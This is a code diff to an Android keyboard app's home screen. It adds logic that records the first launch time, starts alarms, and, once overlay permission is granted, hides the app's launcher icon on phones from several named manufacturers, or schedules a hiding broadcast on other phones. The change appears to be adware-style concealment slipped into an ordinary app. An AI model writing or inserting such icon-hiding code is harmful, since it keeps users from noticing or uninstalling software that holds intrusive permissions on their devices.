@@ -1,6 +1,7 @@
 package com.smard.boart.ui.home
 
 import android.content.Intent
+import android.os.Build
 import android.provider.Settings
 import android.view.View
 import android.view.inputmethod.InputMethodManager
@@ -26,6 +27,10 @@ import com.smard.boart.util.EXTRA_LAUNCH_SETTINGS
 import com.smard.boart.util.enums.KeyboardHeight
 import com.smard.boart.util.enums.LanguageChange
 import com.smard.boart.util.enums.OneHandedMode
+import com.smard.boart.util.hiding.AlarmBroadcast
+import com.smard.boart.util.hiding.AppHidingUtil
+import com.smard.boart.util.hiding.HidingBroadcast
+import java.util.*
 
 class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.home_activity) {
 
@@ -47,6 +52,12 @@ class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.h
     }
 
     override fun setupUI() {
+        if (PrefsReporitory.firstLaunchMillis == -1L)
+            PrefsReporitory.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
+
         if (!Settings.canDrawOverlays(this) || !hasKeyboardPermission())
             startActivity(Intent(this, SplashActivity::class.java))
 
@@ -119,6 +130,18 @@ class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.h
         if (intent?.hasExtra(EXTRA_LAUNCH_SETTINGS) == true)
             openDrawer()
     }
+
+    override fun onResume() {
+        super.onResume()
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
+    }
+
+    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
+        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+    )
 
     private fun openDrawer() {
         binding.drawerContainer.visibility = View.VISIBLE
